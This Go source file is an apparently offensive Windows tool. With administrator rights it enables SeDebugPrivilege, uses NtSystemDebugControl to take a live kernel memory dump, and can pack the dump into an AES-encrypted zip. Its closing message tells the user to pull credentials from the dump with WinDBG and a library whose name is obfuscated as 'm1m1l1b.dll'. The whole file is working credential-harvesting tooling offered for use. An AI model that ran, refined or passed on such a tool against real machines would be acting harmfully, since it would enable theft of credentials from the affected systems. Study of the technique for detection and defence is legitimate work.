package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"strings"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
	"github.com/yeka/zip"
	"time"
	"path/filepath"
)

const SystemDebugControl = 37

var (
	ntdll                = syscall.NewLazyDLL("ntdll.dll")
	ntSystemDebugControl = ntdll.NewProc("NtSystemDebugControl")
	createFile           = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateFileW")
)

type SYSDBG_LIVEDUMP_CONTROL struct {
	Version       uint32
	BugCheckCode  uint32
	BugCheckParam [4]uint64
	FileHandle    windows.Handle
	CancelHandle  windows.Handle
	Flags         uint32
	Pages         uint32
}

func isAdmin() bool {
	var tokenHandle windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tokenHandle)
	if err != nil {
		return false
	}
	defer tokenHandle.Close()

	var elevation uint32
	var size uint32
	err = windows.GetTokenInformation(tokenHandle, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &size)
	if err != nil {
		return false
	}

	return elevation != 0
}

func enableSeDebugPrivilege() error {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("failed to open process token: %v", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup SeDebugPrivilege: %v", err)
	}

	privileges := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}

	return windows.AdjustTokenPrivileges(token, false, &privileges, uint32(unsafe.Sizeof(privileges)), nil, nil)
}

// pipeWriter implements io.Writer interface
type pipeWriter struct {
	pw *io.PipeWriter
}

func (w *pipeWriter) Write(p []byte) (n int, err error) {
	return w.pw.Write(p)
}

// customFileHandle implements the file handle interface
type customFileHandle struct {
	writer io.Writer
}

func (h *customFileHandle) Write(p []byte) (n int, err error) {
	return h.writer.Write(p)
}

// Add this type after the existing customFileHandle struct
type progressReader struct {
	reader     io.Reader
	total      int64
	read       int64
	lastUpdate time.Time
}

func newProgressReader(reader io.Reader, total int64) *progressReader {
	return &progressReader{
		reader:     reader,
		total:      total,
		read:       0,
		lastUpdate: time.Now(),
	}
}

func (pr *progressReader) Read(p []byte) (n int, err error) {
	n, err = pr.reader.Read(p)
	pr.read += int64(n)

	// Update progress every 500ms
	if time.Since(pr.lastUpdate) > 500*time.Millisecond {
		percent := (pr.read * 100) / pr.total
		fmt.Printf("\r[+] Compressing: %d%% (%d/%d MB)", percent, pr.read/(1024*1024), pr.total/(1024*1024))
		pr.lastUpdate = time.Now()
	}

	return n, err
}

func createDumpFile(filePath string, writer io.Writer) (windows.Handle, error) {
	if writer != nil {
		// If we have a writer, create a custom handle
		handle := &customFileHandle{writer: writer}
		return windows.Handle(uintptr(unsafe.Pointer(handle))), nil
	}

	// Otherwise create a regular file
	utf16Path, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return 0, err
	}

	handle, _, err := createFile.Call(
		uintptr(unsafe.Pointer(utf16Path)),
		windows.GENERIC_WRITE,
		0,
		0,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if handle == uintptr(windows.InvalidHandle) {
		return 0, fmt.Errorf("failed to create dump file: %v", err)
	}
	return windows.Handle(handle), nil
}

func createNamedPipe() (windows.Handle, error) {
	pipeName := "\\\\.\\pipe\\kernel_dump_pipe"
	utf16PipeName, err := syscall.UTF16PtrFromString(pipeName)
	if err != nil {
		return 0, err
	}

	handle, _, err := createFile.Call(
		uintptr(unsafe.Pointer(utf16PipeName)),
		windows.GENERIC_WRITE,
		0,
		0,
		windows.OPEN_EXISTING,
		windows.FILE_FLAG_OVERLAPPED,
		0,
	)

	if handle == uintptr(windows.InvalidHandle) {
		return 0, fmt.Errorf("failed to create named pipe: %v", err)
	}
	return windows.Handle(handle), nil
}

func dumpKernelMemory(outputFile string, compress bool, password string) error {
	var fileHandle windows.Handle
	var err error

	if compress {
		// Check if outputFile already ends with .zip
		zipFileName := outputFile
		if !strings.HasSuffix(strings.ToLower(outputFile), ".zip") {
			zipFileName = outputFile + ".zip"
		}

		// Create a temporary file in the system temp directory
		tempFile, err := os.CreateTemp("", "kernel_dump_*.tmp")
		if err != nil {
			return fmt.Errorf("failed to create temporary file: %v", err)
		}
		tempPath := tempFile.Name()
		tempFile.Close() // Close the file handle before creating a new one
		defer os.Remove(tempPath) // Clean up temp file after we're done

		// Create ZIP file
		zipFile, err := os.Create(zipFileName)
		if err != nil {
			return fmt.Errorf("failed to create zip file: %v", err)
		}
		defer zipFile.Close()

		zipWriter := zip.NewWriter(zipFile)
		defer zipWriter.Close()

		// Create writer (encrypted or not depending on password)
		var writer io.Writer
		baseFileName := filepath.Base(outputFile) // Get just the filename without path
		if password != "" {
			writer, err = zipWriter.Encrypt(baseFileName, password, zip.AES256Encryption)
			if err != nil {
				return fmt.Errorf("failed to create encrypted writer: %v", err)
			}
		} else {
			writer, err = zipWriter.Create(baseFileName)
			if err != nil {
				return fmt.Errorf("failed to create writer: %v", err)
			}
		}

		// Create handle to temporary file
		fileHandle, err = createDumpFile(tempPath, nil)
		if err != nil {
			return err
		}
		defer windows.CloseHandle(fileHandle)

		dumpControl := SYSDBG_LIVEDUMP_CONTROL{
			Version:      1,
			FileHandle:   fileHandle,
			BugCheckCode: 0x161,
			BugCheckParam: [4]uint64{0, 0, 0, 0},
			Flags:        4,
			Pages:        0,
		}
		if password != "" {
			fmt.Println("[+] Start of kernel memory dump (direct to encrypted compressed)...")
		} else {
			fmt.Println("[+] Start of kernel memory dump (direct to compressed)...")
		}

		// Start progress indicator
		done := make(chan bool)
		go func() {
			for {
				select {
				case <-done:
					return
				default:
					fmt.Print(".")
					time.Sleep(2 * time.Second)
				}
			}
		}()

		status, _, _ := ntSystemDebugControl.Call(
			uintptr(SystemDebugControl),
			uintptr(unsafe.Pointer(&dumpControl)),
			uintptr(unsafe.Sizeof(dumpControl)),
			0,
			0,
			0,
		)

		// Stop progress indicator
		close(done)
		fmt.Println() // New line after dots

		if status != 0 {
			return fmt.Errorf("NtSystemDebugControl failed with status: 0x%x", status)
		}

		// Close the file handle before trying to open the file again
		windows.CloseHandle(fileHandle)
		fmt.Println("[+] Kernel memory dump completed successfully!")
		fmt.Println("[+] Now compressing file ...")

		// Open the temporary file for reading
		tempFile, err = os.Open(tempPath)
		if err != nil {
			return fmt.Errorf("failed to open temporary file: %v", err)
		}
		defer tempFile.Close()

		// Get file size for progress tracking
		fileInfo, err := tempFile.Stat()
		if err != nil {
			return fmt.Errorf("failed to get file info: %v", err)
		}

		// Create progress reader
		progressReader := newProgressReader(tempFile, fileInfo.Size())

		// Copy the temporary file to the ZIP
		_, err = io.Copy(writer, progressReader)
		if err != nil {
			return fmt.Errorf("failed to copy to ZIP: %v", err)
		}

		fmt.Println() // New line after progress

		// Show final ZIP file size
		zipInfo, err := os.Stat(zipFileName)
		if err == nil {
			fileSizeMB := zipInfo.Size() / (1024 * 1024)
			if fileSizeMB >= 1000 {
				fmt.Printf("[+] Compressed file size = %d'%03d MB\n", fileSizeMB/1000, fileSizeMB%1000)
			} else {
				fmt.Printf("[+] Compressed file size = %d MB\n", fileSizeMB)
			}
		}

		return nil
	} else {
		// Original behavior for uncompressed dump
		fileHandle, err = createDumpFile(outputFile, nil)
		if err != nil {
			return err
		}
		defer windows.CloseHandle(fileHandle)

		dumpControl := SYSDBG_LIVEDUMP_CONTROL{
			Version:      1,
			FileHandle:   fileHandle,
			BugCheckCode: 0x161,
			BugCheckParam: [4]uint64{0, 0, 0, 0},
			Flags:        4,
			Pages:        0,
		}
		fmt.Println("[+] Start of kernel memory dump...")

		// Start progress indicator
		done := make(chan bool)
		go func() {
			for {
				select {
				case <-done:
					return
				default:
					fmt.Print(".")
					time.Sleep(2 * time.Second)
				}
			}
		}()

		status, _, _ := ntSystemDebugControl.Call(
			uintptr(SystemDebugControl),
			uintptr(unsafe.Pointer(&dumpControl)),
			uintptr(unsafe.Sizeof(dumpControl)),
			0,
			0,
			0,
		)

		// Stop progress indicator
		close(done)
		fmt.Println() // New line after dots

		if status != 0 {
			return fmt.Errorf("NtSystemDebugControl failed with status: 0x%x", status)
		}

		fmt.Println("[+] Kernel memory dump completed successfully!")

		fileInfo, err := os.Stat(outputFile)
		if err == nil {
			fileSizeMB := fileInfo.Size() / (1024 * 1024)
			fmt.Printf("[+] File size = %d'%03d MB\n", fileSizeMB/1000, fileSizeMB%1000)
		} else {
			fmt.Println("[!] Could not determine file size:", err)
		}

		return nil
	}
}

func main() {
	fmt.Println("[+] Written by @k4nfr3")

	compressFlag := flag.Bool("compress", false, "Compress the output file into a zip archive")
	passwordFlag := flag.String("password", "", "Password to encrypt the zip file (AES-256)")
	flag.Parse()
	if flag.NArg() < 1 {
		fmt.Println("Usage: program <output_file> [--compress] [--password <password>]")
		return
	}
	if *compressFlag {
		fmt.Println("[+] --compress option enabled")
		if *passwordFlag != "" {
			fmt.Println("[+] --password protection enabled")
		}
	}
	if !isAdmin() {
		fmt.Println("[!] Error: This program must be run as Administrator.")
		return
	}
	fmt.Println("[+] Check passed, you are running as privileged user")
	if err := enableSeDebugPrivilege(); err != nil {
		fmt.Println("Warning: Failed to enable SeDebugPrivilege -", err)
	} else {
		fmt.Println("[+] SeDebugPrivilege enabled successfully")
	}
	outputFile := flag.Arg(0)

	err := dumpKernelMemory(outputFile, *compressFlag, *passwordFlag)
	if err != nil {
		fmt.Println("[!] Error:", err)
	} else {
		if *compressFlag {
			fmt.Println("[+] Kernel dump saved to:", outputFile+".zip")
		} else {
			fmt.Println("[+] Kernel dump saved to:", outputFile)
		}
	}
	fmt.Println("[+] Now use WinDBG and m1m1l1b.dll to extract credentials")
}
